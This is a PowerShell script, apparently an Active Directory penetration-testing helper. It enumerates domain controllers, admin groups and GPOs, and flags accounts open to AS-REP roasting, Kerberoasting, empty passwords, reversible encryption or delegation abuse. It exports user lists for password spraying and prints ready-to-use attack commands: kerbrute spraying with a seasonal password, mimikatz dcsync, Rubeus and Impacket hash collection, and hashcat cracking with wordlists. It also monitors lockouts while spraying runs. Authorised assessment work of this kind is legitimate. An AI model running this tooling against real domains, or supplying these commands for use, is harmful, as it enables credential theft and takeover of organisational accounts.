# Import the DLL if no RSAT
# Import-Module .\Microsoft.ActiveDirectory.Management_x64.dll


function Show-CustomMenu
{
    Clear-Host
    Write-Host "================ Options ================"
    Write-Host 
    Write-Host "---Generic Info---"
    Write-Host "1: Domain Info (incl. DCs, Admin groups)"
    Write-Host "2: Export full user list"
    Write-Host 
    Write-Host "--- Weakness Stuff ---"
    Write-Host "3: Exploit suggestions"
    Write-Host "4: Show vuln users (1 table)"
    Write-Host
    Write-Host "--- Lookups ---"
    Write-Host "5: Check attributes of a single user"
    Write-Host "6: GPO Search & Dump (Name)"
    Write-Host "7: GPO Search & Dump (Content based)"
    Write-Host
    Write-Host "--- PW Spraying---"
    Write-Host "9: Export userlist for PW Spraying"
    Write-Host "0: Monitore User Lockouts"
    Write-Host
    Write-Host "Q: Quit"
    Write-Host 
    Write-host
    # Choose
    $choice = Read-Host "Choose"

    # Select option
    switch ($choice){
  
        '1' {getDomainInfo}
        '2' {fulluserexport}
        '3' {vulnuserexport}
        '4' {showvulnuser}
        '5' {checkuser}
        '6' {gposearchname}
        '7' {gposearchcontent}
        '9' {pwsprayinguserexport}
        '0' {monitorelockouts}
            'q' {exit}
        }
}

function fulluserexport
{
    Clear-Host
    Write-Host "====================================================="
    Write-Host "=============== Export Full user list================"
    Write-Host "====================================================="
    Write-Host 
    $table = Get-ADUser -Properties * -Filter * -Server $domain | Select-Object SamAccountName,CN,Enabled,LockedOut,badPwdCount,PasswordLastSet,PasswordExpired,CanonicalName,AllowReversiblePasswordEncryption,DoesNotRequirePreAuth,PasswordNotRequired,@{n='servicePrincipalName';e={$_.servicePrincipalName.Value -join ';'}},TrustedToAuthForDelegation,@{n='PrincipalsAllowedToDelegateToAccount';e={$_.PrincipalsAllowedToDelegateToAccount.Value -join ';'}},Description | Export-Csv -Encoding "utf8" -NoTypeInformation -path users.csv
    pause
    Show-CustomMenu
}

function pwsprayinguserexport
{
    Clear-Host
    Write-Host "====================================================="
    Write-Host "============= User Export for PW Spraying============"
    Write-Host "====================================================="
    Write-Host 
    Write-Host "Searching for Accounts which are: Enabled, not locked, 0 badpwCount, PW is not expired"
    Write-Host
    $table = Get-ADUser -Properties SamAccountName,LockedOut,badPwdCount,PasswordExpired -Filter {Enabled -eq "true"} -Server $domain | where-object {$_.LockedOut -eq 0 -and $_.badPwdCount -eq 0-and $_.PasswordExpired -eq 0} | Select-Object SamAccountName -ExpandProperty SamAccountName
    Write-Host "Found"$table.count "Users. Usernames exportet to users_pw_spraying.txt"

    $domain = Get-ADDomain -Server $domain | select-object PDCEmulator,Forest
    Write-Host 
    Write-Host "Perform PW spraying with:"
    Write-Host "./kerbrute_linux_amd64 passwordspray -d"$domain.Forest"--dc"$domain.PDCEmulator"users_pw_spraying.txt 'Sommer2020!'"
    $table | Out-File -Encoding utf8 -FilePath users_pw_spraying.txt
    Write-Host 
    Write-Host 
    Write-Host "================ Options ================"
    
    $monlockouts = Read-Host "Monitore Lockouts? (y/n)"
    # Select option
    switch ($monlockouts){
         'y' {monitorelockouts}
         'n' {Show-CustomMenu}
     }
     Show-CustomMenu
}

function vulnuserexport
{
    Clear-Host
    Write-Host "====================================================="
    Write-Host "================ Exploit suggestions ================"
    Write-Host "====================================================="
    Write-Host 
    $table = Get-ADUser -Properties * -Filter * -Server $domain | Select-Object SamAccountName,CN,Enabled,LockedOut,badPwdCount,CanonicalName,AllowReversiblePasswordEncryption,DoesNotRequirePreAuth,PasswordNotRequired,@{n='servicePrincipalName';e={$_.servicePrincipalName.Value -join ';'}},TrustedForDelegation,TrustedToAuthForDelegation,@{n='PrincipalsAllowedToDelegateToAccount';e={$_.PrincipalsAllowedToDelegateToAccount.Value -join ';'}},@{n='msDS-AllowedToDelegateTo';e={$_."msDS-AllowedToDelegateTo".Value -join ';'}},Description

    $ReversiblePasswordEncryption = $table | Where-Object {$_.AllowReversiblePasswordEncryption -eq 1} | select-object SamAccountName,Enabled,AllowReversiblePasswordEncryption,CanonicalName,Description
    $ASREPRoastable = $table | Where-Object {$_.DoesNotRequirePreAuth -eq 1} | select-object SamAccountName,Enabled,DoesNotRequirePreAuth,CanonicalName,Description
    $Kerboroastable = $table | Where-Object {$_.servicePrincipalName -ne ''} | select-object SamAccountName,Enabled,servicePrincipalName,CanonicalName,Description
    $NoPWRequired = $table | Where-Object {$_.PasswordNotRequired -eq 1 -and $_.Enabled -eq 1} | select-object SamAccountName,Enabled,PasswordNotRequired,CanonicalName,Description
    $Unconstraineddelegation = $table | Where-Object {$_.TrustedForDelegation -eq 1} | select-object SamAccountName,Enabled,TrustedForDelegation,CanonicalName,Description
    $Constraineddelegation = $table | Where-Object {$_.TrustedToAuthForDelegation -ne ''} | select-object SamAccountName,Enabled,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo,CanonicalName,Description
    
    Write-Host "================ Overview ================ "
    Write-Host 
    if (($ReversiblePasswordEncryption | Measure-Object).count -gt 0) {write-host "Reversible PW encryption:" ($ReversiblePasswordEncryption | Measure-Object).count; $showrevpwenc = 1} else {write-host "Reversible PW encryption:0"}
    if (($ASREPRoastable | Measure-Object).count -gt 0) {write-host "ASREP roastable:" ($ASREPRoastable | Measure-Object).count; $showasproastable = 1} else {write-host "ASREP roastable: 0"}
    if (($Kerboroastable | Measure-Object).count -gt 0) {write-host "Kerboroastable:" ($Kerboroastable | Measure-Object).count; $showKerboroastable = 1} else {write-host "Kerboroastable: 0"}    
    if (($NoPWRequired | Measure-Object).count -gt 0) {write-host "NO PW required:" ($NoPWRequired | Measure-Object).count; $showNoPWRequired = 1} else {write-host "NO PW required: 0"}
    if (($Unconstraineddelegation | Measure-Object).count -gt 0) {write-host "Unconstrained delegation:" ($Unconstraineddelegation | Measure-Object).count; $showUnconstraineddelegation = 1} else {write-host "Unconstrained delegation: 0"}
    if (($Constraineddelegation | Measure-Object).count -gt 0) {write-host "Constrained delegation:" ($Constraineddelegation | Measure-Object).count; $showConstraineddelegation = 1} else {write-host "Constrained delegation: 0"}

    Write-Host 
    Write-Host 
    Write-Host "================ Details ================ "
    Write-Host 

   
    if ($showrevpwenc -eq 1) {
        write-host "ReversiblePasswordEncryption"
        write-host "-------------------------------------------------------------------------------------------------------------------------------------"
        write-host "Caused by: Accounts which have the 'Store password using reverisble encryption.."
        write-host "Attack: Need Domain admin or DC sync rights to retrive the cleartext PW!"
        write-host "Exploitation:"
        write-host "Use mimikatz: lsadump::dcsync /domain:fec.local /user:userrevpassword"
        write-host  
        write-host  "PS: IMO the PW has to be set AFTER the flag was activated otherwhise the pw isn't stored."
        write-host  
        $ReversiblePasswordEncryption | format-table
        $ReversiblePasswordEncryption | Export-Csv -Encoding "utf8" -NoTypeInformation -path reversiblepw_enc.csv
    } else {

    }    
    
    if ($showasproastable -eq 1) {
        write-host "ASREP roastable"
        write-host "-------------------------------------------------------------------------------------------------------------------------------------"
        write-host
        write-host "Caused by: Accounts which have the 'Do not require Kerberos preauthentication' flag set."
        write-host "Attack: send a fake AS-REQ, to receive the users Hash to crack it offline."
        write-host "Exploitation:"
        write-host "1. WINDOWS: Collect Hashes: Rubeus_v4.8.exe asreproast /format:hashcat /outfile:hashes.asreproast"
        write-host "1. LINUX: Create usernames.txt with the account names. Collect the Hashes (Impacket): python3 ./GetNPUsers.py dc1.fec.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast"
        write-host "2. Crack it with Hashcat: hashcat --attack-mode 0 --hash-type 18200 --optimized-kernel-enable hashes.asreproast /srv/wordlists/ALL-COMBINED.txt --rules-file /srv/rules/nsa_500.txt"
        write-host
        write-host "* Esspecially check non-service accounts, because they are more likely to have a weaker password!"
        write-host
        write-host "Affected accounts:"
        $ASREPRoastable | format-table
        $ASREPRoastable | Export-Csv -Encoding "utf8" -NoTypeInformation -path ASREPRoastable.csv
    } else {

    }

    if ($showKerboroastable -eq 1) {
        write-host "Kerboroasting"
        write-host "-------------------------------------------------------------------------------------------------------------------------------------"
        write-host
        write-host "Caused by: Accounts with SPN"
        write-host "Attack: Get the NTHash of a Service Account"
        write-host "Exploitation:"
        write-host "1. WINDOWS: Collect Hashes: Rubeus_v4.8.exe asreproast kerberoast /outfile:kerberoasting_hashes.txt"
        write-host "1. LINUX: Collect Hashes (Impacket): ./GetUserSPNs.py -request domain/username[:password]"
        write-host "2. Crack it with Hashcat: `hashcat --attack-mode 0 --hash-type 13100 --optimized-kernel-enable kerberoasting_hashes.txt --session=85xxx-kerberoast-quick /srv/wordlists/uncompressed/crackstation-human-only.txt --rules-file /srv/rules/nsa_500.txt"
        write-host
        write-host "Affected accounts:"
        $Kerboroastable | format-table
        $Kerboroastable | Export-Csv -Encoding "utf8" -NoTypeInformation -path kerboroastable.csv
    } else {

    }

    if ($showNoPWRequired -eq 1) {
        write-host "NO PW required"
        write-host "-------------------------------------------------------------------------------------------------------------------------------------"
        write-host
        write-host "Caused by: AD Account misconfiguration Attribut: userAccountControl"
        write-host "Attack: Try to login with an empty password."
        write-host "Exploitation:"
        write-host "1. LINUX: Performing kerbbrute: ./kerbrute_linux_amd64 passwordspray -d  contoso.com --dc XXX.contoso.com users.txt ''"
        write-host
        write-host "* Warning: Be carefull to not lock out the account!"
        write-host
        write-host "Affected accounts:"
        $NoPWRequired | format-table
        $NoPWRequired | Export-Csv -Encoding "utf8" -NoTypeInformation -path pwnotrequired.csv
    } else {

    }

    if ($showUnconstraineddelegation -eq 1) {
        write-host "Unconstrained delegation"
        write-host "-------------------------------------------------------------------------------------------------------------------------------------" 
        $Unconstraineddelegation | format-table
        $Unconstraineddelegation | Export-Csv -Encoding "utf8" -NoTypeInformation -path unconstraind_delegation.csv
    } else {

    }

    if ($showConstraineddelegation -eq 1) {
        write-host "Constrained delegation"
        write-host "-------------------------------------------------------------------------------------------------------------------------------------" 
        $Constraineddelegation | format-table
        $Constraineddelegation | Export-Csv -Encoding "utf8" -NoTypeInformation -path constrained_delegation.csv
    } else {

    }
    pause
    Show-CustomMenu
}

function showvulnuser
{
    Clear-Host
    Write-Host "================ Show Vuln User ================"
    $table = Get-ADUser -Properties * -Filter * -Server $domain | Select-Object SamAccountName,CN,Enabled,LockedOut,badPwdCount,CanonicalName,AllowReversiblePasswordEncryption,DoesNotRequirePreAuth,PasswordNotRequired,@{n='servicePrincipalName';e={$_.servicePrincipalName.Value -join ';'}},TrustedToAuthForDelegation,@{n='PrincipalsAllowedToDelegateToAccount';e={$_.PrincipalsAllowedToDelegateToAccount.Value -join ';'}},Description
    $table | Where-Object {$_.Enabled -eq 1 -and ($_.AllowReversiblePasswordEncryption -eq 1 -or $_.DoesNotRequirePreAuth -eq 1 -or $_.PasswordNotRequired -eq 1 -or $_.servicePrincipalName -ne '' -or $_.TrustedToAuthForDelegation -ne '' -or $_.PrincipalsAllowedToDelegateToAccount -ne '')} | format-table
    pause
    Show-CustomMenu
}

function checkuser
{
    Clear-Host
    Write-Host "===================================================="
    Write-Host "================ Check User Details ================"
    Write-Host "===================================================="
    $user = Read-Host "Username"
    Get-ADUser -Identity $user -Properties * -Server $domain
    write-host "test"
    pause
    Show-CustomMenu 
}

function monitorelockouts
{

    $lockedout = Get-ADUser -properties samaccountname,LockedOut, badPwdCount, LastBadPasswordAttempt,LastLogonDate -filter * -Server $domain | where-object {$_.LockedOut -eq 1} | select-object samaccountname,LockedOut, badPwdCount, LastBadPasswordAttempt,LastLogonDate | format-table

    while($true) {
        Clear-Host
        Write-Host "====================================================="
        Write-Host "================  Monitore Lockouts  ================"
        Write-Host "====================================================="
        Write-Host 
        Write-Host "Check performed:" (get-date).ToString('T')
        if ($lockedout) { $lockedout }else {write-host "No locked account found."}
        Start-Sleep -Milliseconds 5000
        $lockedout = Get-ADUser -properties samaccountname,LockedOut, badPwdCount, LastBadPasswordAttempt,LastLogonDate -filter * -Server $domain | where-object {$_.LockedOut -eq 1} | select-object samaccountname,LockedOut, badPwdCount, LastBadPasswordAttempt,LastLogonDate | format-table
    }
    
}

function getDomainInfo
{


    Clear-Host
    Write-Host "======================================================"
    Write-Host "=================== GET Domain Info =================="
    Write-Host "======================================================"
    Write-Host
    Write-Host "---Domain Info---"
    Get-ADDomain -Server $domain | select-object Forest,DomainMode,UsersContainer,ComputersContainer,InfrastructureMaster,ParentDomain,ChildDomains | format-table
    Write-Host
    Write-Host "---DC Info---"
    Get-ADDomainController -Server $domain | select-object Hostname,IPv4Address, IsReadOnly, IsGlobalCatalog,OperatingSystem,OperationMasterRoles,ComputerObjectDN | format-table
    Write-Host
    Write-Host "---Admin Groups (contain string admin)---"
    Get-ADGroup -Filter 'Name -like "*admin*"' -Properties * -Server $domain | select-object SAMAccountName, @{l='Members';e={($_.Members.split(';') | foreach-object -process { $_.split(',').split('=')[1]})}},@{n='MemberOf';e={($_.MemberOf.split(';') | foreach-object -process { $_.split(',').split('=')[1]})}},DistinguishedName,Description |format-table
    Write-Host
    Write-Host "---Users in the Admin Groups (recursive search)---"
    Write-Host
    Get-ADGroup -Filter 'Name -like "*admin*"' -Properties * -Server $domain | get-adgroupmember -Recursive | Get-ADUser -Properties SamAccountName,Enabled,PasswordLastSet,DoesNotRequirePreAuth,Description,memberof | select-object SamAccountName,Enabled,PasswordLastSet,DoesNotRequirePreAuth,Description,@{l='Member Of';e={($_.memberof.split(';') | foreach-object -process { $_.split(',').split('=')[1]})}} | sort-object -Property SamAccountName -Unique | format-table
    Write-Host
    Write-Host "---Misc---"
    Get-ADObject -Identity ((Get-ADDomain -Server $domain).distinguishedname) -Properties ms-DS-MachineAccountQuota -Server $domain| select-object ms-DS-MachineAccountQuota | format-table
    Write-Host
    pause
    Show-CustomMenu
}

function gposearchname
{


    Clear-Host
    Write-Host "====================================================="
    Write-Host "================== GPO Search Name =================="
    Write-Host "====================================================="
    Write-Host
    Write-Host "Search for a GPO (name). Leave empty to display and dump all."
    Write-Host
    $searchstring = Read-Host "Search string"
    write-host 
    $hitGposInDomain = Get-GPO -All -Domain $forest | where-object {$_.DisplayName -like "*$searchstring*"}
    $listgpo = ''
    $resultsgpo = New-Object System.Collections.ArrayList
    $resultsgporights = New-Object System.Collections.ArrayList

    foreach ($gpo in $hitGposInDomain) {
        $report = Get-GPOReport -Guid $gpo.Id -ReportType Xml -Domain $forest


        write-host "- Match in: $($gpo.DisplayName)" -foregroundcolor "Green"
        [xml]$xmlElm = $report
        $report | Out-File -FilePath ("GPO_" + $gpo.DisplayName + ".txt")
        Get-GPOReport -Guid $gpo.Id -ReportType html -Domain $forest | Out-File -FilePath ("GPO_" + $gpo.DisplayName + ".html")
        $listgpo = New-Object System.Object
        $listgpo | Add-Member -MemberType NoteProperty -Name "GPO Name" -Value $gpo.DisplayName     
        $listgpo | Add-Member -MemberType NoteProperty -Name "Enabled Computer" -Value $xmlElm.GPO.Computer.Enabled
        $listgpo | Add-Member -MemberType NoteProperty -Name "Enabled User" -Value $xmlElm.GPO.User.Enabled
        $listgpo | Add-Member -MemberType NoteProperty -Name "Link Path (OU)" -Value $xmlElm.GPO.LinksTo.SOMPath
        $listgpo | Add-Member -MemberType NoteProperty -Name "Enabled Link" -Value $xmlElm.GPO.LinksTo.Enabled
        $listgpo | Add-Member -MemberType NoteProperty -Name "GPO ID" -Value $gpo.Id
        $resultsgpo.Add($listgpo) | Out-Null

        
        foreach ($object in $xmlElm.GPO.SecurityDescriptor.Permissions.TrusteePermissions) {
            $listgporights = New-Object System.Object
            $listgporights | Add-Member -MemberType NoteProperty -Name "GPO Name" -Value $gpo.DisplayName 
            $listgporights | Add-Member -MemberType NoteProperty -Name "Group" -Value $object.Trustee.Name."#text"
            $listgporights | Add-Member -MemberType NoteProperty -Name "rights" -Value $object.Standard.GPOGroupedAccessEnum

            $resultsgporights.Add($listgporights) | Out-Null
        }
        
        $resultsgporights.Add($listgporights) | Out-Null
        

    }
    write-host 
    write-host "--------------------GPO's found --------------------"
    $resultsgpo | format-table
    write-host "*The content of the policy has been saved as file in the current path."
    write-host 
    write-host "--------------------GPO rights--------------------"
    $resultsgporights | format-table

    pause
    Show-CustomMenu
}

function gposearchcontent
{


    Clear-Host
    Write-Host "======================================================"
    Write-Host "================= GPO Search Content ================="
    Write-Host "======================================================"
    Write-Host
    Write-Host "Search for a specific string in all GPO's. Leave empty to display and dump all."
    Write-Host
    $searchstring = Read-Host "Search string"
    write-host 
    $allGposInDomain = Get-GPO -All -Domain $forest
    $listgpo = ''
    $resultsgpo = New-Object System.Collections.ArrayList
    $resultsgporights = New-Object System.Collections.ArrayList

    foreach ($gpo in $allGposInDomain) {
        $report = Get-GPOReport -Guid $gpo.Id -ReportType Xml -Domain $forest

        if ($report -match $searchstring) {
            write-host "- Match in: $($gpo.DisplayName)" -foregroundcolor "Green"
            [xml]$xmlElm = $report
            $report | Out-File -FilePath ("GPO_" + $gpo.DisplayName + ".txt")
            Get-GPOReport -Guid $gpo.Id -ReportType html -Domain $forest | Out-File -FilePath ("GPO_" + $gpo.DisplayName + ".html")
            $listgpo = New-Object System.Object
            $listgpo | Add-Member -MemberType NoteProperty -Name "GPO Name" -Value $gpo.DisplayName     
            $listgpo | Add-Member -MemberType NoteProperty -Name "Enabled Computer" -Value $xmlElm.GPO.Computer.Enabled
            $listgpo | Add-Member -MemberType NoteProperty -Name "Enabled User" -Value $xmlElm.GPO.User.Enabled
            $listgpo | Add-Member -MemberType NoteProperty -Name "Link Path (OU)" -Value $xmlElm.GPO.LinksTo.SOMPath
            $listgpo | Add-Member -MemberType NoteProperty -Name "Enabled Link" -Value $xmlElm.GPO.LinksTo.Enabled
            $listgpo | Add-Member -MemberType NoteProperty -Name "GPO ID" -Value $gpo.Id
            $resultsgpo.Add($listgpo) | Out-Null

        
            foreach ($object in $xmlElm.GPO.SecurityDescriptor.Permissions.TrusteePermissions) {
                $listgporights = New-Object System.Object
                $listgporights | Add-Member -MemberType NoteProperty -Name "GPO Name" -Value $gpo.DisplayName 
                $listgporights | Add-Member -MemberType NoteProperty -Name "Group" -Value $object.Trustee.Name."#text"
                $listgporights | Add-Member -MemberType NoteProperty -Name "rights" -Value $object.Standard.GPOGroupedAccessEnum

                $resultsgporights.Add($listgporights) | Out-Null
            }
        
            $resultsgporights.Add($listgporights) | Out-Null
        

        } else {
         write-host "- No Match: $($gpo.DisplayName)"
        }

    }
    write-host 
    write-host "--------------------GPO which contain the string--------------------"
    $resultsgpo | format-table
    write-host "*The content of the policy has been saved as file in the current path."
    write-host 
    write-host "--------------------GPO rights--------------------"
    $resultsgporights | format-table

    pause
    Show-CustomMenu
}

# Check if Domain query is possible
$domain = $env:Computername

while(!$goon){
    
    if ($env:Computername -ne $domain) {

        Write-Host "Performing connectivity check..."
        Write-Host 
        Try{
            $domaintest = get-addomain -Server $domain
        }catch{
            Write-Host "Can't retrive info from domain.."
            Write-Host "Important start the script with: runas /netonly /user:%domain%%user% powershell"
        }
    }
    
    if (($domaintest | Measure-Object).count -gt 0) {
    
    $goon = 1
    $forest = $domaintest.Forest

    } else {
        Write-Host
        write-host "Current Domain: "$domain
        $domain = Read-Host "Set Domain"    
    } 

}


Show-CustomMenu


 